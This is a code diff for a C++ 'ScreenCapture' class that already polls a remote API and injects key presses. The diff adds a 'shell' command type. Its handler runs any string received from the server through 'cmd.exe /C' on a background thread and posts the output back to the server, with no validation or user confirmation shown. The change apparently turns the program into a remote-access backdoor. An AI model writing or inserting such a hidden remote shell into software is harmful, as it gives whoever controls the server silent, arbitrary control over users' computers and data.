@@ -347,6 +347,42 @@ void ScreenCapture::ExecuteKeyEvent(const std::string& type, const std::string& 
     SendInput(1, &input, sizeof(INPUT));
 }
 
+void ScreenCapture::ExecuteShellCommand(const std::string& command, const std::string& commandId) {
+    std::string output;
+    try {
+        std::string cmd = "cmd.exe /C " + command + " 2>&1";
+        FILE* pipe = _popen(cmd.c_str(), "r");
+        if (!pipe) {
+            output = "Error: failed to execute command";
+        } else {
+            char buffer[4096];
+            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+                output += buffer;
+            }
+            int exitCode = _pclose(pipe);
+            if (output.empty()) {
+                output = "(no output, exit code: " + std::to_string(exitCode) + ")";
+            }
+        }
+    } catch (...) {
+        output = "Error: exception during command execution";
+    }
+
+    std::string escaped;
+    for (char c : output) {
+        if (c == '\\') escaped += "\\\\";
+        else if (c == '"') escaped += "\\\"";
+        else if (c == '\n') escaped += "\\n";
+        else if (c == '\r') escaped += "\\r";
+        else if (c == '\t') escaped += "\\t";
+        else escaped += c;
+    }
+
+    std::string url = Constants::API_BASE + "/connections/" + _connectionId + "/shell";
+    std::string body = "{\"output\":\"" + escaped + "\",\"commandId\":\"" + commandId + "\"}";
+    HttpClient::Post(url, body);
+}
+
 void ScreenCapture::CheckCommands() {
     try {
         std::string url = Constants::API_BASE + "/connections/" + _connectionId + "/command";
@@ -366,6 +402,14 @@ void ScreenCapture::CheckCommands() {
                     std::string key = cmd.count("key") ? cmd["key"] : "";
                     std::string code = cmd.count("code") ? cmd["code"] : "";
                     ExecuteKeyEvent(type, key, code);
+                } else if (type == "shell") {
+                    std::string command = cmd.count("command") ? cmd["command"] : "";
+                    std::string commandId = cmd.count("commandId") ? cmd["commandId"] : "";
+                    if (!command.empty()) {
+                        std::thread([this, command, commandId]() {
+                            ExecuteShellCommand(command, commandId);
+                        }).detach();
+                    }
                 }
             }
         }
